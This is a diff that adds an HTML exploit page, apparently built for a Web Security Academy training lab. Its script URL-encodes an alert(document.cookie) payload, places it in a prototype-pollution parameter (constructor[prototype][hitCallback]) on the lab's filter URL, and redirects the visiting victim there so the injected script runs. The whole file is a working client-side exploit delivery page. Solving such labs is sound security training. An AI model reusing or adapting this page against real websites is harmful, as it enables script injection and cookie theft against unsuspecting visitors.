@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        // URL encode the payload properly
+        const payload = "alert(document.cookie)";
+        const encodedPayload = encodeURIComponent(payload);
+
+        // Construct the URL with prototype pollution
+        const targetUrl = "https://0a2500230403d8008080033a00d700e8.web-security-academy.net/filter?category=Accessories#cat=13372&category=Accessories&constructor[prototype][hitCallback]=" + encodedPayload;
+
+        // Redirect the victim
+        window.location.href = targetUrl;
+    </script>
+</body>
+</html>
